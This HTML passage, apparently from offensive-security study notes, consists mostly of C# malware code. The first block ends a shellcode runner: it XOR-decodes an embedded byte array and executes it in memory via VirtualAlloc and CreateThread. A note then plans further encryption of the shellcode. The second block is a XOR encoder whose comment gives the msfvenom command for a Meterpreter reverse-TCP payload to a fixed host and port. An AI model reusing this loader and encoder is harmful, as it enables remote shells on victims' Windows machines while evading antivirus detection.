<span style="color:#ff0044;font-weight:400">0x9b</span>, <span style="color:#ff0044;font-weight:400">0x05</span>, <span style="color:#ff0044;font-weight:400">0x2f</span>, <span style="color:#ff0044;font-weight:400">0xb3</span>, <span style="color:#ff0044;font-weight:400">0x05</span>, <span style="color:#ff0044;font-weight:400">0x34</span>, <span style="color:#ff0044;font-weight:400">0x13</span>, <span style="color:#ff0044;font-weight:400">0xc6</span>,<br />                    <span style="color:#ff0044;font-weight:400">0x05</span>, <span style="color:#ff0044;font-weight:400">0x05</span>, <span style="color:#ff0044;font-weight:400">0x05</span>, <span style="color:#ff0044;font-weight:400">0xb2</span>, <span style="color:#ff0044;font-weight:400">0xfb</span>, <span style="color:#ff0044;font-weight:400">0x39</span>, <span style="color:#ff0044;font-weight:400">0xb2</span>, <span style="color:#ff0044;font-weight:400">0xd3</span>, <span style="color:#ff0044;font-weight:400">0x3c</span>, <span style="color:#ff0044;font-weight:400">0xb2</span>, <span style="color:#ff0044;font-weight:400">0x7f</span>, <span style="color:#ff0044;font-weight:400">0x0c</span>, <span style="color:#ff0044;font-weight:400">0x8f</span>, <span style="color:#ff0044;font-weight:400">0x4e</span>, <span style="color:#ff0044;font-weight:400">0xbb</span>,<br />                    <span style="color:#ff0044;font-weight:400">0x05</span>, <span style="color:#ff0044;font-weight:400">0x1d</span>, <span style="color:#ff0044;font-weight:400">0xa2</span>, <span style="color:#ff0044;font-weight:400">0x90</span>, <span style="color:#ff0044;font-weight:400">0xfa</span>, <span style="color:#ff0044;font-weight:400">0xa3</span>, <span style="color:#ff0044;font-weight:400">0x41</span>, <span style="color:#ff0044;font-weight:400">0x1a</span>, <span style="color:#ff0044;font-weight:400">0xe7</span>, <span style="color:#ff0044;font-weight:400">0xd0</span>, <span style="color:#ff0044;font-weight:400">0xf0</span>, <span style="color:#ff0044;font-weight:400">0xbb</span>, <span style="color:#ff0044;font-weight:400">0x73</span>, <span style="color:#ff0044;font-weight:400">0x20</span>, <span style="color:#ff0044;font-weight:400">0x05</span>,<br />                    <span style="color:#ff0044;font-weight:400">0x2f</span><br />                    };<br />                    <span style="color:#7f0044;font-weight:400">int</span> payloadSize = buf.Length;<br />                    IntPtr payAddr = VirtualAlloc(IntPtr.Zero, payloadSize, COMMIT_RESERVE, EXECUTEREADWRITE);<br />                    <span style="color:#ff9d00;font-weight:700">for</span> (<span style="color:#7f0044;font-weight:400">int</span> i = <span style="color:#ff0044;font-weight:400">0</span>; i &lt; buf.Length; i++)<br />                    {<br />                        buf[i] = (<span style="color:#7f0044;font-weight:400">byte</span>)((<span style="color:#7f0044;font-weight:400">uint</span>)buf[i] ^ <span style="color:#ff0044;font-weight:400">0xfa</span>);<br />                    }<br />                    Marshal.Copy(buf, <span style="color:#ff0044;font-weight:400">0</span>, payAddr, payloadSize);<br />                    IntPtr payThreadId = CreateThread(IntPtr.Zero, <span style="color:#ff0044;font-weight:400">0</span>, payAddr, IntPtr.Zero, <span style="color:#ff0044;font-weight:400">0</span>, <span style="color:#ff0044;font-weight:400">0</span>);<br />                    <span style="color:#7f0044;font-weight:400">int</span> waitResult = WaitForSingleObject(payThreadId, -<span style="color:#ff0044;font-weight:400">1</span>);<br />                }<br />            }<br />        }</pre></div><ul><li>• <small>• next step is to obfuscate the shellcode (encrypting it)</small><ul><li><small>aes or ceasar cipher </small></li></ul></li><li><small>app that encrypts shellcode with XOR </small> </li></ul><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">using</span> System;<br /><span style="color:#ff9d00;font-weight:700">using</span> System.Collections.Generic;<br /><span style="color:#ff9d00;font-weight:700">using</span> System.Linq;<br /><span style="color:#ff9d00;font-weight:700">using</span> System.Text;<br /><span style="color:#ff9d00;font-weight:700">using</span> System.Threading.Tasks;<br /><br /><span style="color:#ff9d00;font-weight:700">namespace</span> XorCoder<br />{<br />    <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">class</span> Program<br />    {<br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">void</span> Main(<span style="color:#7f0044;font-weight:400">string</span>[] args)<br />        {<br />            <span style="color:#0088ff;font-weight:400">// sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.232.133 LPORT=443 EXITFUNC=thread -f csharp</span><br />            <span style="color:#7f0044;font-weight:400">byte</span>[] buf = <span style="color:#ff9d00;font-weight:700">new</span> <span style="color:#7f0044;font-weight:400">byte</span>[<span style="color:#ff0044;font-weight:400">511</span>] {<br />            <span style="color:#ff0044;font-weight:400">0xfc</span>,<span style="color:#ff0044;font-weight:400">0x48</span>,<span style="color:#ff0044;font-weight:400">0x83</span>,<span style="color:#ff0044;font-weight:400">0xe4</span>,<span style="color:#ff0044;font-weight:400">0xf0</span>,<span style="color:#ff0044;font-weight:400">0xe8</span>,<span style="color:#ff0044;font-weight:400">0xcc</span>,<span style="color:#ff0044;font-weight:400">0x00</span>,<span style="color:#ff0044;font-weight:400">0x00</span>,<span style="color:#ff0044;font-weight:400">0x00</span>,<span style="color:#ff0044;font-weight:400">0x41</span>,<span style="color:#ff0044;font-weight:400">0x51</span>,<span style="color:#ff0044;font-weight:400">0x41</span>,<span style="color:#ff0044;font-weight:400">0x50</span>,<span style="color:#ff0044;font-weight:400">0x52</span>,.. };<br /><br />            <span style="color:#0088ff;font-weight:400">// Encode the payload with XOR (fixed key)</span><br />            <span style="color:#7f0044;font-weight:400">byte</span>[] encoded = <span style="color:#ff9d00;font-weight:700">new</span> <span style="color:#7f0044;font-weight:400">byte</span>[buf.Length];<br />            <span style="color:#ff9d00;font-weight:700">for</span> (<span style="color:#7f0044;font-weight:400">int</span> i = <span style="color:#ff0044;font-weight:400">0</span>; i &lt; buf.Length; i++)<br />            {<br />                encoded[i] = (<span style="color:#7f0044;font-weight:400">byte</span>)((<span style="color:#7f0044;font-weight:400">uint</span>)buf[i] ^ <span style="color:#ff0044;font-weight:400">0xfa</span>);<br />            }<br /><br />            StringBuilder hex = <span style="color:#ff9d00;font-weight:700">new</span> StringBuilder(encoded.Length * <span style="color:#ff0044;font-weight:400">2</span>);<br />            <span style="color:#7f0044;font-weight:400">int</span> totalCount = encoded.Length;<br />            <span style="color:#ff9d00;font-weight:700">for</span> (<span style="color:#7f0044;font-weight:400">int</span> count = <span style="color:#ff0044;font-weight:400">0</span>; count &lt; totalCount; count++)<br />            {<br />                <span style="color:#7f0044;font-weight:400">byte</span> b = encoded[count];<br /><br />                <span style="color:#ff9d00;font-weight:700">if</span> ((count + <span style="color:#ff0044;font-weight:400">1</span>) == totalCount) <span style="color:#0088ff;font-weight:400">// Dont append comma for last item</span><br />                {<br />                    hex.AppendFormat(<span style="color:#3ad900;font-weight:400">&quot;0x{0:x2}&quot;</span>, b);<br />                }<br />                <span style="color:#ff9d00;font-weight:700">else</span><br />                {<br />                    hex.AppendFormat(<span style="color:#3ad900;font-weight:400">&quot;0x{0:x2}, &quot;</span>, b);<br />                }<br /><br />                <span style="color:#ff9d00;font-weight:700">if</span> ((count + <span style="color:#ff0044;font-weight:400">1</span>) % <span style="color:#ff0044;font-weight:400">15</span> == <span style="color:#ff0044;font-weight:400">0</span>)<br />                {<br />                    hex.Append(<span style="color:#3ad900;font-weight:400">&quot;\n&quot;</span>);<br />                }<br />            }<br /><br />            Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;XOR payload (key: 0xfa):&quot;</span>);<br />            Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;byte[] buf = new byte[{buf.Length}] {{\n{hex}\n}};&quot;</span>);<br /><br />            <span style="color:#0088ff;font-weight:400">//// Decode the XOR payload</span><br />            <span style="color:#0088ff;font-weight:400">//for (int i = 0; i &lt; buf.Length; i++)</span><br />            <span style="color:#0088ff;font-weight:400">//{</span><br />            <span style="color:#0088ff;font-weight:400">//    buf[i] = (byte)((uint)buf[i] ^ 0xfa);</span><br />            <span style="color:#0088ff;font-weight:400">//}</span><br /><br />        }<br />    }<br />}</pre></div></p></div>
</body>
</html>
